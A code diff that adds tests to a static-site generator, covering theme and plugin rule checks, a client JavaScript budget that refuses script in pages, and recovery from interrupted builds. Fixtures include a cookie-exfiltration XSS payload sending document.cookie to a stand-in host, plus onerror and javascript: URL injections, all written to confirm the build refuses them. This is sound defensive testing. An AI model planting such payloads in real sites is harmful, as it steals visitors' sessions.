@@ -3,8 +3,9 @@ import { cpSync, existsSync, renameSync, mkdirSync, readdirSync, readFileSync, r
 import { join, relative, resolve } from "node:path";
 import { parseMarkdown, buildTree, type Block } from "@snypd/core";
 import { build, toHtml, inline, minifyCss, slugify, excerpt, jsx, raw, Html, loadTheme, loadHooks, part, menu, flowSteps, tokensCss, styleSheet, CSS_LAYERS, atImport, resolveTokens, fontFaceCss } from "./index";
-import { loadConfig, initRepo, lintSite, LIVE_ROUTE } from "@snypd/core";
+import { loadConfig, initRepo, lintSite, scaffoldTheme, scaffoldPlugin, LIVE_ROUTE } from "@snypd/core";
 import { preview } from "./preview";
+import { checkTheme, checkPlugin, formatCheck } from "./check";
 import { deskPage, type DeskOnboarding } from "./desk";
 import { imageSize, svgSize } from "./media";
 import { png } from "../../bench/src/corpus";
@@ -2276,3 +2277,296 @@ The second heading with this text, which is what makes the id de-duplication wor
   });
 });
 
+/**
+ * X1 — E8: a stranger's theme, judged by a machine.
+ *
+ * Two halves, and the second is the one that matters. Every rule passing on `base`, `editorial` and
+ * `technical` proves only that the checker is not hostile; a checker that returns "pass" unconditionally
+ * would do as well. So each rule also gets a fixture built to break it *and only it*, and the assertion
+ * is on the rule's name — because decision 123 makes this the gate for the shelf, and a refusal a
+ * submitter cannot argue with by name is a refusal that will be argued with by email.
+ */
+describe("`check theme` and `check plugin` (X1): every rule, on a theme that passes and one that does not", () => {
+  const root = "corpora/_test/x1";
+  const theme = (name: string, files: Record<string, string>) => {
+    for (const [f, body] of Object.entries(files)) {
+      const p = join(root, "themes", name, f);
+      mkdirSync(join(p, ".."), { recursive: true });
+      writeFileSync(p, body);
+    }
+  };
+  /** A palette that clears 4.5:1 everywhere, so a fixture about something else is not also a contrast fixture. */
+  const PALETTE = `  color.bg:        { default: "light-dark(#ffffff, #14161a)", customisable: true, kind: color, description: "Page background." }
+  color.surface:   { default: "light-dark(#f4f5f7, #1d2026)", customisable: true, kind: color, description: "Raised blocks." }
+  color.text:      { default: "light-dark(#16181d, #e6e8ec)", customisable: true, kind: color, description: "Body text." }
+  color.muted:     { default: "light-dark(#5b6068, #9aa0aa)", customisable: true, kind: color, description: "Captions." }
+  color.accent:    { default: "light-dark(#1f5fbf, #7fb0f2)", customisable: true, kind: color, description: "Links." }
+  color.on-accent: { default: "light-dark(#ffffff, #14161a)", customisable: true, kind: color, description: "On an accent fill." }
+`;
+  const head = (name: string) => `theme: ${name}\nversion: 0.1.0\nspec: ^1\nextends: base\ncss: ./theme.css\npersonality: A fixture, and it says so.\n`;
+  const rule = (r: { rules: { rule: string; status: string; detail: string }[] }, name: string) => r.rules.find((x) => x.rule === name)!;
+
+  beforeAll(() => {
+    rmSync(root, { recursive: true, force: true });
+    mkdirSync(join(root, "content/posts"), { recursive: true });
+    writeFileSync(join(root, "snypd.yaml"), `snypd: 1\nsite: { name: X1, url: https://x1.example }\ntheme:\n  use: base\n`);
+    // The real themes, so "passes" is a claim about what ships and not about a fixture written to pass.
+    for (const t of ["base", "editorial", "technical"]) cpSync(`themes/${t}`, join(root, `themes/${t}`), { recursive: true, filter: (f) => !f.endsWith("package.json") });
+
+    // One fixture per rule, each breaking exactly one thing.
+    theme("no-face", { "theme.yaml": `${head("no-face")}tokens:\n${PALETTE}`, "theme.css": "body { color: var(--color-text); }\n" });
+    theme("dim", {
+      // Muted at #a8acb2 on white is 2.3:1 — the single most common real defect in a hand-made palette,
+      // and the one nothing in this product could see before today.
+      "theme.yaml": `${head("dim")}tokens:\n${PALETTE.replace('color.muted:     { default: "light-dark(#5b6068, #9aa0aa)"', 'color.muted:     { default: "light-dark(#a8acb2, #4a4e55)"')}`,
+      "theme.css": "body { color: var(--color-text); }\n",
+    });
+    theme("invented", {
+      "theme.yaml": `${head("invented")}tokens:\n${PALETTE}variations:\n  plain: { description: As declared }\n  bold:\n    description: A look that reaches past the palette\n    tokens:\n      color.accent: "#1f5fbf"\n      color.ring: "#ff0000"\n`,
+      "theme.css": "body { color: var(--color-text); }\n",
+    });
+    theme("importer", { "theme.yaml": `${head("importer")}tokens:\n${PALETTE}`, "theme.css": `@import url("other.css");\nbody { color: var(--color-text); }\n` });
+    theme("half-part", { "theme.yaml": `${head("half-part")}parts:\n  header: ./parts/header.tsx\ntokens:\n${PALETTE}`, "theme.css": "body { color: var(--color-text); }\n" });
+    theme("typo", { "theme.yaml": `${head("typo")}layout: post\ntokens:\n${PALETTE}`, "theme.css": "body { color: var(--color-text); }\n" });
+    theme("anonymous", { "theme.yaml": `theme: anonymous\nversion: 0.1.0\nextends: base\ncss: ./theme.css\ntokens:\n${PALETTE}`, "theme.css": "body { color: var(--color-text); }\n" });
+  });
+  afterAll(() => rmSync(root, { recursive: true, force: true }));
+
+  test("the three themes that ship pass every rule, and the numbers are in the output", async () => {
+    for (const name of ["base", "editorial", "technical"]) {
+      const r = await checkTheme(root, name);
+      expect({ name, ok: r.ok }).toEqual({ name, ok: true });
+      // No rule may pass by saying nothing: a row with an empty detail is a badge with no evidence.
+      for (const x of r.rules) expect(x.detail.length).toBeGreaterThan(0);
+    }
+    // `base` is the floor and declares no colours at all, so the contrast gate has nothing to measure —
+    // and says so rather than passing. `skip` is not `pass`, which is the whole of why it is a status.
+    const base = await checkTheme(root, "base");
+    expect(rule(base, "contrast.text").status).toBe("skip");
+    expect(rule(base, "contrast.text").detail).toContain("declares no `color.text`");
+
+    // `editorial` is the theme with a webfont, and all three font rules have something to say about it.
+    const ed = await checkTheme(root, "editorial");
+    expect(rule(ed, "font.budget").detail).toContain("30.33 KB");
+    expect(rule(ed, "font.used").status).toBe("pass");
+    // Every look, on every side of `light-dark()` it renders, with the ratio — `technical`'s `phosphor`
+    // commits to `color.scheme: dark`, so it is measured once and not twice.
+    const te = await checkTheme(root, "technical");
+    expect(rule(te, "contrast.muted").detail).toContain("phosphor dark");
+    expect(rule(te, "contrast.muted").detail).not.toContain("phosphor light");
+    expect(rule(te, "contrast.muted").detail).toMatch(/graphite light \d+\.\d\d:1/);
+  });
+
+  test("a dim palette fails `contrast.muted`, and only that", async () => {
+    const r = await checkTheme(root, "dim");
+    expect(r.ok).toBe(false);
+    expect(r.rules.filter((x) => x.status === "fail").map((x) => x.rule)).toEqual(["contrast.muted"]);
+    expect(rule(r, "contrast.muted").detail).toContain("below 4.5:1");
+    expect(rule(r, "contrast.text").status).toBe("pass");
+    // The same theme with a readable muted passes outright — so the rule is measuring the colour and not
+    // the fixture's other habits.
+    expect((await checkTheme(root, "no-face")).ok).toBe(true);
+  });
+
+  test("a variation that invents a token fails `variations.declared`, naming the token and the look", async () => {
+    const r = await checkTheme(root, "invented");
+    expect(rule(r, "variations.declared").status).toBe("fail");
+    expect(rule(r, "variations.declared").detail).toContain("bold sets `color.ring`");
+    // `color.accent` is retuned by the same variation and is not a finding: retuning is what a variation is.
+    expect(rule(r, "variations.declared").detail).not.toContain("color.accent");
+  });
+
+  test("the loader's own refusals arrive as `contract.loads`, with the message that names the file", async () => {
+    const imported = await checkTheme(root, "importer");
+    expect(rule(imported, "contract.loads").status).toBe("fail");
+    expect(rule(imported, "contract.loads").detail).toContain("@import");
+    const half = await checkTheme(root, "half-part");
+    expect(rule(half, "contract.loads").status).toBe("fail");
+    expect(rule(half, "contract.loads").detail).toContain(`part "header" is declared in theme.yaml`);
+  });
+
+  test("a mistyped key fails `contract.yaml` with its line, and a missing personality fails the shelf", async () => {
+    const typo = await checkTheme(root, "typo");
+    expect(rule(typo, "contract.yaml").status).toBe("fail");
+    expect(rule(typo, "contract.yaml").detail).toContain(`unknown key "layout"`);
+    expect(rule(typo, "contract.yaml").detail).toContain("theme.yaml");
+    const anon = await checkTheme(root, "anonymous");
+    expect(rule(anon, "meta.personality").status).toBe("fail");
+    expect(anon.ok).toBe(false);
+  });
+
+  test("a scaffolded theme is checkable, and fails on exactly the sentence the author has to write", async () => {
+    const r = scaffoldTheme(root, { name: "fresh" });
+    expect(r.extends).toBe("base");
+    // The scaffold's stylesheet names `--color-bg`; `base` declares no tokens; so the scaffold declares
+    // them. Before X1 it did not, and a theme made this way rendered with eight undefined properties.
+    expect(readFileSync(join(root, "themes/fresh/theme.yaml"), "utf8")).toContain("color.bg:");
+    const c = await checkTheme(root, "fresh");
+    expect(c.rules.filter((x) => x.status === "fail").map((x) => x.rule)).toEqual(["meta.personality"]);
+    expect(rule(c, "contrast.muted").status).toBe("pass");
+    // Write the one sentence and it is shelf-ready — which is the loop the two verbs exist to close.
+    const y = join(root, "themes/fresh/theme.yaml");
+    writeFileSync(y, readFileSync(y, "utf8").replace(/personality: >-[\s\S]*?\n\ntokens:/, "personality: Quiet, narrow, and grey.\n\ntokens:"));
+    expect((await checkTheme(root, "fresh")).ok).toBe(true);
+  });
+
+  test("`check plugin` passes a first-party plugin and fails a scaffolded one on its description", async () => {
+    const auto = await checkPlugin(".", "autolink");
+    expect(auto.ok).toBe(true);
+    expect(rule(auto, "contract.tiers").detail).toBe("transforms");
+    expect(rule(auto, "capabilities.client").detail).toContain("0 KB");
+    scaffoldPlugin(root, { name: "ribbon" });
+    const fresh = await checkPlugin(root, "ribbon");
+    expect(fresh.rules.filter((x) => x.status === "fail").map((x) => x.rule)).toEqual(["meta.description"]);
+    // A name nothing answers to is a fail with one rule and no guesswork.
+    const gone = await checkPlugin(root, "nothing-here");
+    expect(gone.rules).toEqual([{ rule: "contract.found", status: "fail", detail: expect.stringContaining("no plugin") }]);
+  });
+
+  test("formatCheck prints one line per rule, the rule's name first", async () => {
+    const out = formatCheck(await checkTheme(root, "dim"));
+    expect(out.split("\n")[0]).toContain("theme dim — themes/dim");
+    expect(out).toContain("contrast.muted");
+    expect(out.trimEnd().split("\n").at(-1)).toContain("1 failed");
+  });
+});
+
+describe("the client budget (H2): the build weighs the page it wrote, on the site that wrote it", () => {
+  const root = "corpora/_test/client-budget";
+  const dist = join(root, "dist");
+  const config = (extra = "", plugins = "[]") => writeFileSync(join(root, "snypd.yaml"), `snypd: 1\nsite: { name: B, url: https://b.example }\ntheme: { use: base }\nplugins: ${plugins}\n${extra}`);
+  const post = (body: string) => writeFileSync(join(root, "content/posts/a.md"), `---\ntitle: A\ndate: 2026-09-01\nstatus: published\n---\n\nIntro.\n\n${body}\n`);
+  const refusal = async () => { try { await build(root); return undefined; } catch (e) { return (e as Error).message; } };
+  beforeAll(() => {
+    rmSync(root, { recursive: true, force: true });
+    for (const d of ["content/posts", "content/media", "plugins/undeclared", "plugins/declared"]) mkdirSync(join(root, d), { recursive: true });
+    writeFileSync(join(root, "plugins/undeclared/end.ts"), "export default () => '<script defer src=\"https://tracker.example/t.js\"></script>';\n");
+    writeFileSync(join(root, "plugins/undeclared/snypd.yaml"), "plugin: { name: undeclared, version: 0.0.1, api: 1, slots: { body-end: ./end.ts } }\n");
+    writeFileSync(join(root, "plugins/declared/end.ts"), "export default () => '<script defer src=\"https://tracker.example/t.js\"></script>';\n");
+    writeFileSync(join(root, "plugins/declared/snypd.yaml"), "plugin: { name: declared, version: 0.0.1, api: 1, capabilities: { client: 2kb }, slots: { body-end: ./end.ts } }\n");
+  });
+  afterAll(() => rmSync(root, { recursive: true, force: true }));
+
+  test("E6: a content file's script is refused at the default budget of 0, named by page, line and weight — and the index forgets, so the next build refuses too", async () => {
+    config();
+    post("<div>\n<script>fetch('https://x.example/?c='+document.cookie)</script>\n</div>");
+    const m = (await refusal())!;
+    expect(m).toContain("1 page carries more JavaScript than this site afforded — budget 0 KB (bench.budgets.jsKb)");
+    expect(m).toMatch(/posts\/a\/index\.html — 0\.04 KB/);
+    expect(m).toContain(":5 <script>fetch('https://x.example/?c='+document.c…</script> (46 B)");   // line 5 of the page, the body truncated, the weight whole
+    expect(m).toContain("Nothing was rewritten");
+    // the transaction rolled back: no route row claims the bytes, so this is a cold build that refuses again, not a warm one that forgets
+    expect(await refusal()).toBe(m);
+    // the source is the twin: nothing was sanitised on the way — the fix is the author's, and then the page builds
+    post("<div>\n<p>no script here</p>\n</div>");
+    const r = await build(root);
+    expect(r.rendered).toBeGreaterThan(0);
+    expect(readFileSync(join(dist, "posts/a/index.html"), "utf8")).toContain("<p>no script here</p>");
+  });
+
+  test("every shape is weighed — handler, javascript: url, remote src — and a data block is not script", async () => {
+    config();
+    post(`<img src="/x.png" alt="x" onerror="alert(1)">`);
+    expect(await refusal()).toContain(`onerror="alert(1)" (8 B)`);
+    post(`<a href="javascript:alert(1)">x</a>`);
+    expect(await refusal()).toContain(`href="javascript:alert(1)"`);
+    post(`<script type="application/ld+json">{"@type":"Thing"}</script>\n\n<iframe src="https://www.youtube-nocookie.com/embed/x" title="v"></iframe>`);
+    expect(await refusal()).toBeUndefined();
+  });
+
+  test("a budget the site raised affords weighable script; lowering it re-renders every page and refuses again; a remote script nobody declared is over any budget", async () => {
+    post("<script>console.log('afforded')</script>");
+    config("bench: { budgets: { jsKb: 1 } }\n");
+    expect(await refusal()).toBeUndefined();
+    expect(readFileSync(join(dist, "posts/a/index.html"), "utf8")).toContain("console.log('afforded')");
+    // the budget is in the key: a cached page is not a page held to a budget it was never weighed against
+    config();
+    expect(await refusal()).toContain("posts/a/index.html");
+    config("bench: { budgets: { jsKb: 50 } }\n");
+    post(`<script src="https://cdn.example/lib.js"></script>`);
+    const m = (await refusal())!;
+    expect(m).toContain("budget 50 KB (bench.budgets.jsKb)");
+    expect(m).toContain("fetched from another origin and declared by nothing");
+  });
+
+  test("a site-local script is weighed by the file the build wrote, and a script that grows re-renders the page that loads it", async () => {
+    writeFileSync(join(root, "content/media/app.js"), "x".repeat(700));
+    post(`<script src="/media/app.js?v=1"></script>`);
+    config("bench: { budgets: { jsKb: 1 } }\n");
+    expect(await refusal()).toBeUndefined();
+    writeFileSync(join(root, "content/media/app.js"), "x".repeat(1500));
+    const m = (await refusal())!;
+    expect(m).toMatch(/posts\/a\/index\.html — 1\.46 KB/);
+    expect(m).toContain(`<script src="/media/app.js?v=1"> (1500 B)`);
+    rmSync(join(root, "content/media/app.js"));
+  });
+
+  test("script a plugin's slot rendered is charged at the plugin's declaration; a plugin that declared nothing has nothing to stand in", async () => {
+    post("Plain.");
+    config("bench: { budgets: { jsKb: 3 } }\n", "[undeclared]");
+    const m = (await refusal())!;
+    expect(m).toContain(`<script src="https://tracker.example/t.js"> — fetched from another origin and declared by nothing`);
+    expect(m).toContain("from plugin undeclared");
+    config("bench: { budgets: { jsKb: 3 } }\n", "[declared]");
+    expect(await refusal()).toBeUndefined();
+    // …but the declaration covers the plugin's script, not the same url written into a post on a site without the plugin
+    config("bench: { budgets: { jsKb: 3 } }\n");
+    post(`<script defer src="https://tracker.example/t.js"></script>`);
+    expect(await refusal()).toContain("declared by nothing");
+  });
+});
+
+describe("build generations (H3): a build that did not finish is not a build the next one believes", () => {
+  const root = "corpora/_test/generations";
+  const dist = join(root, "dist");
+  const kill = resolve(root, "KILL");
+  const config = (extra = "") => writeFileSync(join(root, "snypd.yaml"), `snypd: 1\nsite: { name: G, url: https://g.example }\ntheme: { use: base }\nplugins: [killer]\n${extra}`);
+  const post = (slug: string, date: string, body: string) => writeFileSync(join(root, `content/posts/${slug}.md`), `---\ntitle: ${slug.toUpperCase()}\ndate: ${date}\nstatus: published\n---\n\n${body}\n`);
+  const page = (slug: string) => readFileSync(join(dist, `posts/${slug}/index.html`), "utf8");
+  beforeAll(() => {
+    rmSync(root, { recursive: true, force: true });
+    for (const d of ["content/posts", "plugins/killer"]) mkdirSync(join(root, d), { recursive: true });
+    // A slot that ends the process, uncatchably, while page b renders — and only while the file says to.
+    writeFileSync(join(root, "plugins/killer/end.ts"), `import { existsSync } from "node:fs";\nexport default ({ route }: { route: string }) => { if (route === "/posts/b" && existsSync(${JSON.stringify(kill)})) process.kill(process.pid, "SIGKILL"); return null; };\n`);
+    writeFileSync(join(root, "plugins/killer/snypd.yaml"), "plugin: { name: killer, version: 0.0.1, api: 1, slots: { body-end: ./end.ts } }\n");
+    config();
+  });
+  afterAll(() => rmSync(root, { recursive: true, force: true }));
+
+  test("finding 8: a build killed after writing a page, then a revert of the source — the next build writes the reverted page, not the killed build's", async () => {
+    rmSync(kill, { force: true });
+    post("a", "2026-09-02", "The first words.");
+    post("b", "2026-09-01", "B stays as it is.");
+    expect((await build(root)).recovered).toBe(0);
+    expect(page("a")).toContain("The first words.");
+    // The edit, and a build that dies part-way: newest first, so a is written and then b takes the process down.
+    post("a", "2026-09-02", "The second words, which were never finished building.");
+    post("b", "2026-09-01", "B changes too, or the route cache would never render it and nothing would die.");
+    writeFileSync(kill, "");
+    const child = Bun.spawn([process.execPath, "-e", `const { build } = await import(${JSON.stringify(resolve("packages/render/src/index.ts"))}); await build(${JSON.stringify(root)});`], { stdout: "ignore", stderr: "ignore" });
+    await child.exited;
+    expect(child.signalCode).toBe("SIGKILL");
+    expect(page("a")).toContain("The second words");   // the interrupted build did write it — so the case is real
+    rmSync(kill);
+    // The author reverts. The source's hash is the first build's again, and so is page a's key.
+    post("a", "2026-09-02", "The first words.");
+    const r = await build(root);
+    expect(page("a")).toContain("The first words.");
+    expect(page("a")).not.toContain("The second words");
+    expect(r.recovered).toBeGreaterThan(0);
+    // …and once a build has finished, nothing is left open.
+    expect((await build(root)).recovered).toBe(0);
+  });
+
+  test("the same hole without a kill: a page the client budget refused is not served by the next build after a revert (H2 × H3)", async () => {
+    post("a", "2026-09-02", "Plain words.");
+    expect((await build(root)).rendered).toBeGreaterThanOrEqual(0);
+    expect(page("a")).toContain("Plain words.");
+    post("a", "2026-09-02", "<script>fetch('https://x.example/?c='+document.cookie)</script>");
+    await expect(build(root)).rejects.toThrow("more JavaScript than this site afforded");
+    post("a", "2026-09-02", "Plain words.");
+    const r = await build(root);
+    expect(page("a")).not.toContain("<script>fetch");
+    expect(r.recovered).toBeGreaterThan(0);
+  });
+});
